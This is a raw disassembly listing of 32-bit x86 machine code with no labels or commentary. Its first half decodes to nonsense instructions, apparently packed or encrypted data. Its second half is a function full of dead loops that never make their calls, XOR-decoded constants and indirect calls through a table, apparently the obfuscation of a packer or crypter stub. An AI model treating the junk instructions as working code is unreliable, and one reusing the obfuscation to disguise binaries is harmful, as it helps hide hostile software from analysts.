  422041:	xchg   edi,eax
  422042:	nop
  422043:	push   0x3a56e437
  422048:	inc    ebx
  422049:	inc    esi
  42204a:	and    BYTE PTR [edi+0x49],bh
  42204d:	ja     0x422026
  42204f:	out    0x69,al
  422051:	inc    esp
  422052:	and    BYTE PTR [edi-0x14de74b8],ch
  422058:	out    dx,eax
  422059:	xchg   ebp,eax
  42205a:	test   BYTE PTR [eax+0x42],bh
  42205d:	ret    0xfe94
  422060:	pop    ecx
  422061:	push   DWORD PTR ds:0x4283a7
  422067:	push   DWORD PTR ds:0x428423
  42206d:	push   DWORD PTR [ebp-0x28]
  422070:	push   DWORD PTR [ebp-0x2c]
  422073:	mov    eax,DWORD PTR [ebp-0x14]
  422076:	call   eax
  422078:	mov    eax,DWORD PTR [ebp-0x30]
  42207b:	jmp    0x42250d
  422080:	xchg   ebp,eax
  422081:	rol    DWORD PTR [edx],0x97
  422084:	push   es
  422085:	mov    eax,DWORD PTR [edi+0x689842c3]
  42208b:	not    BYTE PTR [edx-0x5fd08f2f]
  422091:	mov    bh,BYTE PTR [ebp+0x7a]
  422094:	add    DWORD PTR [esi+0x7a],edi
  422097:	jp     0x4220f5
  422099:	push   ds
  42209a:	mov    ebx,0xd4c296f8
  42209f:	mov    ds:0x524987a8,al
  4220a4:	dec    edx
  4220a5:	rol    BYTE PTR [esi+0x8],1
  4220a8:	xor    ch,ah
  4220aa:	pop    ebp
  4220ab:	inc    ebp
  4220ac:	stos   BYTE PTR es:[edi],al
  4220ad:	in     eax,dx
  4220ae:	frstor [eax-0x4]
  4220b1:	pushf  
  4220b2:	pop    es
  4220b3:	xchg   ah,bh
  4220b5:	mov    ebp,DWORD PTR [ebx]
  4220b7:	das    
  4220b8:	xor    cl,BYTE PTR [ebx+0x10]
  4220bb:	inc    ebp
  4220bc:	adc    eax,0x59bd79f
  4220c1:	test   ebp,eax
  4220c3:	pop    ds
  4220c4:	mov    dh,0x28
  4220c6:	aaa    
  4220c7:	sub    DWORD PTR [edx-0x6beb0819],edi
  4220cd:	lods   eax,DWORD PTR ds:[esi]
  4220ce:	mov    WORD PTR [ebp-0x23],ss
  4220d1:	jmp    0x4220cb
  4220d3:	popa   
  4220d4:	adc    eax,0xf01d32a7
  4220d9:	test   cl,bl
  4220db:	dec    esi
  4220dc:	sub    al,0xf2
  4220de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220df:	xchg   BYTE PTR [edx+ebp*2+0x11cc3cb6],dl
  4220e6:	jb     0x422119
  4220e8:	(bad)  
  4220e9:	mov    ds:0x4197d85c,eax
  4220ee:	mov    al,ds:0x51bb99eb
  4220f3:	dec    eax
  4220f4:	fild   DWORD PTR [esi]
  4220f6:	jnp    0x42210e
  4220f8:	stc    
  4220f9:	fs push esi
  4220fb:	nop
  4220fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220fd:	jb     0x42216d
  4220ff:	outs   dx,DWORD PTR ds:[esi]
  422100:	xchg   ebp,eax
  422101:	ds std 
  422103:	ret    0x5fc
  422106:	inc    edi
  422107:	fdivr  st(3),st
  422109:	xlat   BYTE PTR ds:[ebx]
  42210a:	adc    ch,dh
  42210c:	mov    eax,0x5f9cd8b8
  422111:	ret    
  422112:	and    al,0x84
  422114:	sub    edi,DWORD PTR [ecx]
  422116:	xchg   edi,eax
  422117:	ins    WORD PTR es:[edi],dx
  422119:	mov    esp,0xecc5fb6f
  42211e:	imul   ebx,DWORD PTR [ebp-0xadba9c2],0xe1e0bf93
  422128:	outs   dx,DWORD PTR ds:[esi]
  422129:	mov    edx,0xad55daf1
  42212e:	imul   ecx,DWORD PTR [eax],0xca51418d
  422134:	call   0x5147:0x77652f68
  42213b:	sbb    edi,DWORD PTR [ebp+eax*2+0x1b3198d3]
  422142:	push   0xf32710ba
  422147:	clc    
  422148:	jo     0x4220d4
  42214a:	fisttp DWORD PTR [ebx+esi*1-0x2ec38c69]
  422151:	xchg   ebx,eax
  422152:	inc    ebx
  422153:	fistp  QWORD PTR ds:0xc5b56d3c
  422159:	pop    edx
  42215a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42215b:	add    esp,DWORD PTR [edi]
  42215d:	loop   0x4221be
  42215f:	mov    eax,ds:0x87628ea9
  422164:	adc    ah,BYTE PTR [ebp+0x6f]
  422167:	fsub   DWORD PTR [edx]
  422169:	out    dx,al
  42216a:	jmp    0x8685:0xced27892
  422171:	inc    esi
  422172:	jbe    0x42217f
  422174:	clc    
  422175:	push   ecx
  422176:	add    ch,cl
  422178:	dec    esi
  422179:	dec    esi
  42217a:	cmp    al,0x77
  42217c:	cmp    eax,0x378d0114
  422181:	loope  0x42212e
  422183:	sbb    bh,BYTE PTR [edi-0x4ec59766]
  422189:	nop
  42218a:	enter  0x6b1d,0xac
  42218e:	and    BYTE PTR [edx+eiz*4+0x760255cc],dl
  422195:	loopne 0x4221a8
  422197:	cmc    
  422198:	cld    
  422199:	xor    eax,0x2f76acd6
  42219e:	inc    edi
  42219f:	xchg   ebp,eax
  4221a0:	shl    dh,1
  4221a2:	pop    ebp
  4221a3:	mul    DWORD PTR [esi]
  4221a5:	in     al,dx
  4221a6:	mov    ecx,0x913ad8ea
  4221ab:	sbb    eax,0xe28f6ece
  4221b0:	jb     0x422145
  4221b2:	push   eax
  4221b3:	lds    esp,FWORD PTR [eax+0x212fe557]
  4221b9:	les    ebx,FWORD PTR [ecx-0x48]
  4221bc:	mov    al,ds:0xec688ec4
  4221c1:	add    BYTE PTR [ebx],al
  4221c3:	loop   0x422152
  4221c5:	les    ecx,FWORD PTR [edi-0x5f5dedc5]
  4221cb:	sbb    BYTE PTR [edx+esi*2],0x1d
  4221cf:	dec    esp
  4221d0:	push   edx
  4221d1:	jo     0x422174
  4221d3:	outs   dx,BYTE PTR ds:[esi]
  4221d4:	and    al,0x47
  4221d6:	nop
  4221d7:	jmp    FWORD PTR [esi+eiz*2-0x13120c3a]
  4221de:	outs   dx,DWORD PTR ds:[esi]
  4221df:	pop    eax
  4221e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221e1:	push   es
  4221e2:	mov    ch,BYTE PTR [ebx-0x1d612ecd]
  4221e8:	push   ds
  4221e9:	mov    ecx,0x3bd18e8f
  4221ee:	mov    eax,ds:0x79b724b9
  4221f3:	dec    edi
  4221f4:	bound  edx,QWORD PTR [ebp+0x65]
  4221f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221f8:	push   ebp
  4221f9:	in     al,0x6c
  4221fb:	test   al,0x62
  4221fd:	(bad)  
  4221fe:	push   cs
  4221ff:	mov    bh,bh
  422201:	shl    edi,0xb7
  422204:	push   edx
  422205:	add    eax,0x2ab15c76
  42220a:	in     eax,dx
  42220b:	mov    ecx,0x4b4e8bc0
  422210:	push   eax
  422211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422212:	ja     0x4221c9
  422214:	shr    eax,0x1e
  422217:	mov    bl,0x86
  422219:	xchg   esp,eax
  42221a:	mov    bh,0x5a
  42221c:	lds    esp,FWORD PTR [ecx-0x1b36c356]
  422222:	mov    dh,0x98
  422224:	or     dh,bh
  422226:	cwde   
  422227:	cmp    DWORD PTR [edi+ebx*2-0x60],ebp
  42222b:	mov    al,ds:0x6063061c
  422230:	(bad)  
  422231:	aam    0x4d
  422233:	pop    ebx
  422234:	jp     0x422205
  422236:	shl    BYTE PTR [ecx+ebp*1],0xf9
  42223a:	cmp    eax,0xe75d5ec
  42223f:	stos   BYTE PTR es:[edi],al
  422240:	fstp   DWORD PTR [edx]
  422242:	hlt    
  422243:	adc    DWORD PTR [edi+eax*8],0xfb0c4cb6
  42224a:	push   ecx
  42224b:	sbb    dl,cl
  42224d:	inc    eax
  42224e:	mov    BYTE PTR [edi+0x7c],bl
  422251:	cli    
  422252:	xchg   esi,eax
  422253:	stos   BYTE PTR es:[edi],al
  422254:	inc    edx
  422255:	sbb    al,bh
  422257:	bound  edi,QWORD PTR [ebx]
  422259:	or     eax,0x7f9f3c95
  42225e:	jns    0x422258
  422260:	sbb    eax,0xa368b5de
  422265:	cmp    ebx,DWORD PTR [ebp-0x29]
  422268:	push   0x44db289e
  42226d:	pop    ebx
  42226e:	(bad)  [ebp-0x7d]
  422271:	xor    BYTE PTR [edx],ah
  422273:	xchg   esp,ebp
  422275:	out    0x99,al
  422277:	sbb    DWORD PTR [esi],0xea3f6496
  42227d:	fist   WORD PTR [eax]
  42227f:	inc    ebp
  422280:	addr16 add eax,0xf5532d13
  422286:	push   ecx
  422287:	fsub   st(4),st
  422289:	mov    al,0xd1
  42228b:	fistp  DWORD PTR [eax-0x1b]
  42228e:	lods   eax,DWORD PTR ds:[esi]
  42228f:	call   0x30e:0xd774aced
  422296:	and    ah,BYTE PTR [edx+ebx*4]
  422299:	sbb    eax,0xf640c84d
  42229e:	repnz add ecx,DWORD PTR [ecx]
  4222a1:	push   ecx
  4222a2:	mov    WORD PTR [eax+0x7f],ss
  4222a5:	mov    bh,0x41
  4222a7:	lods   al,BYTE PTR ds:[esi]
  4222a8:	sub    DWORD PTR [ebp+ebp*8+0x7],esp
  4222ac:	cmp    ecx,ebx
  4222ae:	mov    BYTE PTR [ebp-0x9],dl
  4222b1:	pop    ss
  4222b2:	sbb    bl,BYTE PTR [esi-0x24]
  4222b5:	call   0x86b9:0xb589b007
  4222bc:	fidiv  WORD PTR [ebp+esi*4+0x54f47fb6]
  4222c3:	push   esi
  4222c4:	jp     0x4222c2
  4222c6:	inc    esi
  4222c7:	repnz cmp al,0x7c
  4222ca:	mov    ah,BYTE PTR [edi+0x4c]
  4222cd:	dec    ecx
  4222ce:	dec    ebp
  4222cf:	mov    ebp,0x65bc9969
  4222d4:	aaa    
  4222d5:	ret    0xc964
  4222d8:	jecxz  0x42227f
  4222da:	fadd   QWORD PTR [edi+ebx*2+0x56]
  4222de:	jge    0x42228d
  4222e0:	inc    edx
  4222e1:	cdq    
  4222e2:	pusha  
  4222e3:	mov    es,WORD PTR [ebx+0x6607d827]
  4222e9:	popa   
  4222ea:	cmp    eax,0xa6fe072d
  4222ef:	(bad)  
  4222f0:	in     al,dx
  4222f1:	in     al,0x6c
  4222f3:	les    ebp,FWORD PTR [edi]
  4222f5:	cmc    
  4222f6:	xlat   BYTE PTR ds:[ebx]
  4222f7:	js     0x42231e
  4222f9:	sbb    BYTE PTR [eax-0x6e],al
  4222fc:	pusha  
  4222fd:	test   DWORD PTR [edi+ebp*1],ecx
  422300:	(bad)  
  422302:	push   edi
  422303:	cmc    
  422304:	pusha  
  422305:	mov    ch,0xac
  422307:	sbb    ch,bh
  422309:	scas   eax,DWORD PTR es:[edi]
  42230a:	iret   
  42230b:	cmp    eax,0x2a05e2ba
  422310:	jmp    0x9b40:0xdb1fbeaa
  422317:	arpl   WORD PTR [edi+0x76],dx
  42231a:	loope  0x4222ee
  42231c:	sbb    BYTE PTR [esi],ah
  42231e:	mov    DWORD PTR [ebp*8+0x57446550],eax
  422325:	fs inc ebp
  422327:	mov    eax,0xdcc23515
  42232c:	repz mov ah,0x91
  42232f:	je     0x422301
  422331:	fsub   st(1),st
  422333:	sti    
  422334:	jg     0x4222ee
  422336:	shl    BYTE PTR [eax-0x70],cl
  422339:	sub    eax,0xf73b5b9a
  42233e:	fild   QWORD PTR ss:[esi-0x1ad4c6ea]
  422345:	clc    
  422346:	xor    edi,edi
  422348:	mov    ah,bl
  42234a:	inc    ebx
  42234b:	in     eax,0x90
  42234d:	sbb    ebx,edi
  42234f:	ja     0x422309
  422351:	(bad)  
  422353:	mov    al,0x44
  422355:	sub    esi,esi
  422357:	repnz in al,0xe5
  42235a:	stos   BYTE PTR es:[edi],al
  42235b:	into   
  42235c:	std    
  42235d:	shl    DWORD PTR [ebp+0xb11c24a],0x4b
  422364:	jl     0x422360
  422366:	push   es
  422367:	inc    edx
  422368:	fldenv [esi+0x5c]
  42236b:	xor    al,0xd2
  42236d:	imul   eax,DWORD PTR [esi],0x52c2e5e6
  422373:	mov    ds:0x6d325333,al
  422378:	sub    ecx,DWORD PTR [ebp+0x1000ca33]
  42237e:	sti    
  42237f:	mov    ch,dl
  422381:	in     al,0x5b
  422383:	xor    dl,BYTE PTR [ebx+0x52]
  422386:	iret   
  422387:	outs   dx,BYTE PTR ds:[esi]
  422388:	jnp    0x422343
  42238a:	jle    0x422375
  42238c:	mov    al,ds:0x3def90aa
  422391:	jbe    0x422353
  422393:	push   ebp
  422394:	cmp    DWORD PTR [ecx],edi
  422396:	jge    0x4223c2
  422398:	stos   DWORD PTR es:[edi],eax
  422399:	mov    eax,0x4cb2f4ed
  42239e:	push   ebx
  42239f:	pushf  
  4223a0:	pop    eax
  4223a1:	mov    esi,0x5ec9439f
  4223a6:	push   es
  4223a7:	sub    ebp,DWORD PTR ds:0x8fe3fbac
  4223ad:	iret   
  4223ae:	pushf  
  4223af:	dec    esp
  4223b0:	or     bh,bh
  4223b2:	jmp    0x4223ab
  4223b4:	gs jbe 0x4223f4
  4223b7:	cmp    eax,0xd266d5d3
  4223bc:	out    dx,eax
  4223bd:	or     ah,al
  4223bf:	inc    ebx
  4223c0:	test   BYTE PTR [ebx],0x51
  4223c3:	jnp    0x42239e
  4223c5:	push   ecx
  4223c6:	push   0xffffff87
  4223c8:	mov    ah,0x38
  4223ca:	int    0x35
  4223cc:	shl    BYTE PTR [eax],0xfe
  4223cf:	les    eax,FWORD PTR [edi]
  4223d1:	arpl   WORD PTR ds:0xf0421bb3,ax
  4223d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223d8:	cmp    al,0xdb
  4223da:	gs cdq 
  4223dc:	ss jae 0x422393
  4223df:	push   edi
  4223e0:	daa    
  4223e1:	das    
  4223e2:	outs   dx,DWORD PTR ds:[esi]
  4223e3:	mov    esp,0xcfe4902a
  4223e8:	jb     0x42241e
  4223ea:	sub    al,0xc8
  4223ec:	(bad)  
  4223ed:	nop
  4223ee:	into   
  4223ef:	add    BYTE PTR [ebp-0x1c84d990],0xfc
  4223f6:	icebp  
  4223f7:	rol    BYTE PTR [ebx],0x96
  4223fa:	push   esi
  4223fb:	lock iret 
  4223fd:	pop    ss
  4223fe:	xchg   ebx,eax
  4223ff:	out    0x16,al
  422401:	(bad)  
  422402:	cli    
  422403:	xchg   esi,eax
  422404:	jns    0x42242f
  422406:	mov    ah,0x9f
  422408:	pop    esi
  422409:	lds    eax,FWORD PTR [esp+esi*1-0x27922b28]
  422410:	pop    ebp
  422411:	test   DWORD PTR [edi+esi*1+0x66],esp
  422415:	in     al,0x47
  422417:	mov    cl,0xc7
  422419:	ja     0x4223e1
  42241b:	xchg   ch,ah
  42241d:	aas    
  42241e:	fld    TBYTE PTR [ebp-0x4]
  422421:	out    0x6b,eax
  422423:	and    ah,bh
  422425:	mov    edx,0xb2c993ce
  42242a:	add    edi,0x28
  42242d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42242e:	ja     0x422447
  422430:	xlat   BYTE PTR ds:[ebx]
  422431:	pop    ebx
  422432:	arpl   WORD PTR [ecx+esi*4],bx
  422435:	sbb    edi,0xffffffb7
  422438:	dec    esp
  422439:	cld    
  42243a:	jae    0x422442
  42243c:	push   0xffffffce
  42243e:	nop
  42243f:	add    ebx,DWORD PTR [ebx-0x33]
  422442:	iret   
  422443:	or     al,0xfa
  422445:	aam    0x5c
  422447:	mov    ch,0x45
  422449:	in     al,0x29
  42244b:	aad    0x84
  42244d:	jl     0x422470
  42244f:	sbb    edi,DWORD PTR [edx-0x5ad69320]
  422455:	mov    BYTE PTR [ebx],dh
  422457:	inc    eax
  422458:	mov    DWORD PTR [edi-0x71e17a89],edx
  42245e:	mov    esp,0x961fe08c
  422463:	imul   eax,DWORD PTR [eax+eax*4-0x45],0x11441080
  42246b:	xor    DWORD PTR [ebp-0xfa211ed],ecx
  422471:	adc    al,BYTE PTR [ebx-0x36a4a0af]
  422477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422478:	(bad)  
  42247a:	or     ch,ah
  42247c:	fisubr WORD PTR [edi+edx*2]
  42247f:	sub    dh,BYTE PTR [ebx]
  422481:	(bad)  
  422482:	jecxz  0x422418
  422484:	imul   ecx,DWORD PTR [edi-0x2d],0x4d
  422488:	sub    dl,BYTE PTR ds:0xfb063547
  42248e:	push   ds
  42248f:	test   bh,al
  422491:	cmp    al,0x18
  422493:	ins    DWORD PTR es:[edi],dx
  422494:	and    eax,0x2bc5afb
  422499:	call   0x3f99647f
  42249e:	imul   eax,DWORD PTR [edi],0xabdc959a
  4224a4:	in     eax,dx
  4224a5:	test   DWORD PTR [ecx],edx
  4224a7:	xchg   ebp,eax
  4224a8:	xchg   ecx,eax
  4224a9:	ret    0x6147
  4224ac:	mov    dl,0xdd
  4224ae:	inc    eax
  4224af:	jbe    0x422458
  4224b1:	test   eax,0xe4c882ee
  4224b6:	in     eax,dx
  4224b7:	sbb    cl,BYTE PTR [eax+0x74]
  4224ba:	mov    ebx,0xda25b3f5
  4224bf:	outs   dx,DWORD PTR ds:[esi]
  4224c0:	aam    0x91
  4224c2:	mov    al,ds:0x9f36085c
  4224c7:	ret    
  4224c8:	push   ebp
  4224c9:	dec    ecx
  4224ca:	fcomp  DWORD PTR [edx-0x5b]
  4224cd:	inc    ebp
  4224ce:	out    0x58,eax
  4224d0:	jo     0x42250d
  4224d2:	(bad)  
  4224d3:	xor    eax,DWORD PTR [eax+0x35d095ce]
  4224d9:	jg     0x42252f
  4224db:	pop    ss
  4224dc:	jae    0x42255d
  4224de:	arpl   WORD PTR ss:[eax+0x541d2b00],sp
  4224e5:	aad    0xf4
  4224e7:	jmp    0x422481
  4224e9:	popf   
  4224ea:	lahf   
  4224eb:	push   0xffffffe2
  4224ed:	dec    ecx
  4224ee:	mov    ds:0x584e1b82,al
  4224f3:	or     eax,0x2ba86b29
  4224f8:	xchg   edi,eax
  4224f9:	test   BYTE PTR [edx+0x44ed008],bl
  4224ff:	add    dl,BYTE PTR [edx]
  422501:	fidivr DWORD PTR [esi+0x683437e0]
  422507:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422508:	inc    esp
  422509:	mov    edx,ecx
  42250b:	data16 aas 
  42250d:	mov    ecx,DWORD PTR ds:0x42836b
  422513:	add    DWORD PTR [eax],ecx
  422515:	pop    edi
  422516:	pop    esi
  422517:	leave  
  422518:	ret    
  422519:	push   ebp
  42251a:	mov    ebp,esp
  42251c:	sub    esp,0x18
  42251f:	mov    DWORD PTR [ebp-0x10],0xf89f85b0
  422526:	movzx  edx,WORD PTR ds:0x428673
  42252d:	and    edx,DWORD PTR ds:0x42864f
  422533:	mov    DWORD PTR ds:0x428673,edx
  422539:	lea    eax,[ebp+0x14]
  42253c:	adc    DWORD PTR ds:0x428607,0x604f
  422546:	mov    DWORD PTR [ebp-0x4],eax
  422549:	mov    ecx,DWORD PTR ds:0x4285f3
  42254f:	adc    DWORD PTR ds:0x4285df,ecx
  422555:	push   esi
  422556:	add    DWORD PTR ds:0x42861b,ecx
  42255c:	mov    esi,0xf89c85b0
  422561:	or     DWORD PTR ds:0x4285db,0x4285f7
  42256b:	mov    DWORD PTR [ebp-0xc],esi
  42256e:	mov    DWORD PTR ds:0x42862f,0x1a
  422578:	cmp    DWORD PTR ds:0x42862f,0x0
  42257f:	je     0x4225e3
  422585:	cmp    DWORD PTR ds:0x42862f,0xa
  42258c:	jge    0x4225e3
  422592:	jmp    0x4225b7
  422597:	push   0x428673
  42259c:	push   DWORD PTR [ebp-0x20]
  42259f:	push   0x8204
  4225a4:	push   0x6126
  4225a9:	push   0x7868
  4225ae:	push   DWORD PTR [ebp-0x28]
  4225b1:	call   DWORD PTR ds:0x4287c7
  4225b7:	cmp    DWORD PTR ds:0x42862f,0xb
  4225be:	jne    0x4225d1
  4225c4:	mov    edx,DWORD PTR ds:0x42862f
  4225ca:	dec    edx
  4225cb:	mov    DWORD PTR ds:0x42862f,edx
  4225d1:	mov    edx,DWORD PTR ds:0x42862f
  4225d7:	dec    edx
  4225d8:	mov    DWORD PTR ds:0x42862f,edx
  4225de:	jmp    0x422578
  4225e3:	lea    eax,[ebp-0xc]
  4225e6:	mov    DWORD PTR [ebp-0x14],eax
  4225e9:	mov    eax,DWORD PTR [ebp-0xc]
  4225ec:	or     DWORD PTR ds:0x42863f,0x672c
  4225f6:	mov    edx,DWORD PTR [ebp-0x14]
  4225f9:	mov    ecx,0x75108a4
  4225fe:	add    DWORD PTR ds:0x428617,0x428607
  422608:	xor    eax,ecx
  42260a:	add    eax,0x3272ec
  42260f:	sub    DWORD PTR ds:0x42862b,0x430
  422619:	mov    DWORD PTR [edx],eax
  42261b:	movzx  eax,WORD PTR ds:0x42861b
  422622:	sbb    eax,DWORD PTR ds:0x4285cf
  422628:	mov    ds:0x42861b,eax
  42262d:	mov    eax,ds:0x428167
  422632:	mov    DWORD PTR ds:0x428617,0x1a
  42263c:	cmp    DWORD PTR ds:0x428617,0x0
  422643:	je     0x42267f
  422649:	cmp    DWORD PTR ds:0x428617,0x2a
  422650:	jl     0x42267f
  422656:	jmp    0x42266b
  42265b:	push   0x42860b
  422660:	push   0x428083
  422665:	call   DWORD PTR ds:0x4287cb
  42266b:	xor    edx,edx
  42266d:	xor    edx,DWORD PTR ds:0x428617
  422673:	dec    edx
  422674:	mov    DWORD PTR ds:0x428617,edx
  42267a:	jmp    0x42263c
  42267f:	mov    edx,DWORD PTR [ebp-0x4]
  422682:	mov    eax,DWORD PTR [eax]
  422684:	add    eax,DWORD PTR [edx]
  422686:	neg    edx
  422688:	push   edi
  422689:	and    DWORD PTR ds:0x428613,0x0
  422693:	jmp    0x4226a5
  422698:	mov    edi,DWORD PTR ds:0x428613
  42269e:	inc    edi
  42269f:	mov    DWORD PTR ds:0x428613,edi
  4226a5:	cmp    DWORD PTR ds:0x428613,0x13
  4226ac:	jae    0x4226e4
  4226b2:	cmp    DWORD PTR ds:0x428613,0x14
  4226b9:	jb     0x4226e4
  4226bf:	jmp    0x4226df
  4226c4:	push   0x5e63
  4226c9:	push   DWORD PTR [ebp-0x10]
  4226cc:	push   0x40fa
  4226d1:	push   0x57ff
  4226d6:	push   DWORD PTR [ebp-0x14]
  4226d9:	call   DWORD PTR ds:0x42879f
  4226df:	jmp    0x422698
  4226e4:	mov    DWORD PTR [ebp-0x8],eax
  4226e7:	mov    edi,DWORD PTR [ebp+0x8]
  4226ea:	mov    DWORD PTR ds:0x428643,0x13
  4226f4:	cmp    DWORD PTR ds:0x428643,0x0
  4226fb:	je     0x422749
  422701:	cmp    DWORD PTR ds:0x428643,0x8
  422708:	jb     0x422749
  42270e:	jmp    0x42271e
  422713:	push   0x6e63
  422718:	call   DWORD PTR ds:0x4287a3
  42271e:	cmp    DWORD PTR ds:0x428643,0x9
  422725:	jne    0x422736
  42272b:	mov    eax,ds:0x428643
  422730:	dec    eax
  422731:	mov    ds:0x428643,eax
  422736:	xor    eax,eax
  422738:	xor    eax,DWORD PTR ds:0x428643
  42273e:	dec    eax
  42273f:	mov    ds:0x428643,eax
  422744:	jmp    0x4226f4
  422749:	mov    eax,ds:0x4282ef
  42274e:	and    DWORD PTR ds:0x428647,0x0
  422758:	xor    edx,edx
  42275a:	or     edx,DWORD PTR ds:0x428647
  422760:	inc    edx
  422761:	mov    DWORD PTR ds:0x428647,edx
  422767:	cmp    DWORD PTR ds:0x428647,0x8
  42276e:	jb     0x4227ae
  422774:	jmp    0x422787
  422779:	push   DWORD PTR [ebp-0x18]
  42277c:	push   0x42804c
  422781:	call   DWORD PTR ds:0x4287a7
  422787:	cmp    DWORD PTR ds:0x428647,0x7
  42278e:	jne    0x4227a1
  422794:	mov    edx,DWORD PTR ds:0x428647
  42279a:	inc    edx
  42279b:	mov    DWORD PTR ds:0x428647,edx
  4227a1:	cmp    DWORD PTR ds:0x428647,0x16
  4227a8:	jb     0x422758
  4227ae:	mov    eax,DWORD PTR [eax+0x198]
  4227b4:	and    DWORD PTR ds:0x428637,0x0
  4227be:	mov    edx,DWORD PTR ds:0x428637
  4227c4:	inc    edx
  4227c5:	mov    DWORD PTR ds:0x428637,edx
  4227cb:	cmp    DWORD PTR ds:0x428637,0x9
  4227d2:	jg     0x422816
  4227d8:	jmp    0x4227ed
  4227dd:	push   0x428034
  4227e2:	push   0x1
  4227e4:	push   DWORD PTR [ebp-0x1c]
  4227e7:	call   DWORD PTR ds:0x4287ab
  4227ed:	cmp    DWORD PTR ds:0x428637,0x8
  4227f4:	jne    0x422809
  4227fa:	xor    edx,edx
  4227fc:	add    edx,DWORD PTR ds:0x428637
  422802:	inc    edx
  422803:	mov    DWORD PTR ds:0x428637,edx
  422809:	cmp    DWORD PTR ds:0x428637,0x18
  422810:	jb     0x4227be
  422816:	xor    edi,ecx
  422818:	mov    edx,0x3272ec
  42281d:	add    edi,edx
  42281f:	cmp    DWORD PTR [eax],edi
  422821:	je     0x422842
  422827:	mov    DWORD PTR ds:0x42861f,0x7dc0
  422831:	mov    eax,DWORD PTR [eax]
  422833:	mov    DWORD PTR ds:0x428607,0x131c
  42283d:	jmp    0x422ad0
  422842:	mov    DWORD PTR ds:0x4285e3,edi
  422848:	mov    eax,DWORD PTR [ebp+0x18]
  42284b:	cmp    eax,esi
  42284d:	mov    DWORD PTR ds:0x42864f,0x3fa2
  422857:	jne    0x42287b
  42285d:	mov    DWORD PTR ds:0x42860b,0x3d29
  422867:	push   0xf89c85b1
  42286c:	mov    DWORD PTR ds:0x42866b,0x6bac
  422876:	jmp    0x422abf
  42287b:	mov    esi,DWORD PTR [ebp+0x18]
  42287e:	mov    eax,0x14b4
  422883:	mov    eax,0xf89c85b2
  422888:	cmp    esi,eax
  42288a:	jne    0x422aaf
  422890:	mov    eax,DWORD PTR [ebp+0x10]
  422893:	adc    DWORD PTR ds:0x4285cf,0x1af0
  42289d:	xor    eax,ecx
  42289f:	mov    esi,DWORD PTR ds:0x4285ef
  4228a5:	sub    DWORD PTR ds:0x42860f,esi
  4228ab:	add    eax,edx
  4228ad:	and    DWORD PTR ds:0x42863f,0x0
  4228b7:	jmp    0x4228cb
  4228bc:	xor    esi,esi
  4228be:	xor    esi,DWORD PTR ds:0x42863f
  4228c4:	inc    esi
  4228c5:	mov    DWORD PTR ds:0x42863f,esi
  4228cb:	cmp    DWORD PTR ds:0x42863f,0x1d
  4228d2:	jae    0x422914
  4228d8:	cmp    DWORD PTR ds:0x42863f,0xa
  4228df:	jl     0x422914
  4228e5:	jmp    0x4228f5
  4228ea:	push   0x428028
  4228ef:	call   DWORD PTR ds:0x4287af
  4228f5:	cmp    DWORD PTR ds:0x42863f,0x9
  4228fc:	jne    0x42290f
  422902:	mov    esi,DWORD PTR ds:0x42863f
  422908:	inc    esi
  422909:	mov    DWORD PTR ds:0x42863f,esi
  42290f:	jmp    0x4228bc
  422914:	mov    DWORD PTR [ebp-0x18],eax
  422917:	mov    eax,DWORD PTR [ebp+0xc]
  42291a:	mov    esi,DWORD PTR [ebp-0x8]
  42291d:	xor    eax,ecx
  42291f:	add    eax,edx
  422921:	imul   eax,DWORD PTR [esi]
  422924:	mov    esi,DWORD PTR [ebp+0x8]
  422927:	xor    esi,ecx
  422929:	add    esi,edx
  42292b:	cmp    esi,eax
  42292d:	mov    eax,DWORD PTR [ebp-0x4]
  422930:	push   ebx
  422931:	je     0x422950
  422937:	mov    esi,DWORD PTR [ebp-0x18]
  42293a:	add    DWORD PTR [eax],esi
  42293c:	mov    eax,DWORD PTR [ebp-0x4]
  42293f:	mov    esi,DWORD PTR [ebp+0xc]
  422942:	xor    esi,ecx
  422944:	add    esi,edx
  422946:	imul   esi,DWORD PTR [eax]
  422949:	mov    DWORD PTR [eax],esi
  42294b:	jmp    0x422955
  422950:	mov    esi,DWORD PTR [ebp+0x14]
  422953:	xor    DWORD PTR [eax],esi
  422955:	mov    eax,DWORD PTR [ebp-0x4]
  422958:	mov    edi,DWORD PTR [ebp+0x10]
  42295b:	xor    edi,ecx
  42295d:	mov    esi,0xffcd8d14
  422962:	mov    ebx,esi
  422964:	sub    ebx,edi
  422966:	add    DWORD PTR [eax],ebx
  422968:	mov    eax,DWORD PTR [ebp-0x4]
  42296b:	mov    edi,DWORD PTR [ebp-0x8]
  42296e:	add    edi,DWORD PTR [eax]
  422970:	mov    DWORD PTR [ebp-0x8],edi
  422973:	mov    eax,DWORD PTR [ebp+0xc]
  422976:	mov    edi,DWORD PTR [ebp+0xc]
  422979:	xor    edi,ecx
  42297b:	xor    eax,ecx
  42297d:	lea    eax,[eax+edi*1+0x64e5d8]
  422984:	mov    edi,DWORD PTR [ebp+0xc]
  422987:	xor    edi,ecx
  422989:	add    edi,edx
  42298b:	imul   eax,edi
  42298e:	mov    edi,DWORD PTR [ebp+0xc]
  422991:	xor    edi,ecx
  422993:	sub    edi,eax
  422995:	mov    eax,DWORD PTR [ebp-0x4]
  422998:	add    edi,edx
  42299a:	cmp    DWORD PTR [eax],edi
  42299c:	mov    eax,DWORD PTR [ebp-0x4]
  42299f:	mov    edi,DWORD PTR [ebp+0x10]
  4229a2:	jg     0x4229b5
  4229a8:	xor    edi,ecx
  4229aa:	mov    ebx,esi
  4229ac:	sub    ebx,edi
  4229ae:	add    DWORD PTR [eax],ebx
  4229b0:	jmp    0x4229bb
  4229b5:	xor    edi,ecx
  4229b7:	add    edi,edx
  4229b9:	add    DWORD PTR [eax],edi
  4229bb:	mov    eax,DWORD PTR [ebp-0x8]
  4229be:	mov    edi,DWORD PTR [ebp-0x10]
  4229c1:	mov    eax,DWORD PTR [eax]
  4229c3:	xor    edi,ecx
  4229c5:	add    edi,0x3272eb
  4229cb:	not    edi
  4229cd:	and    eax,edi
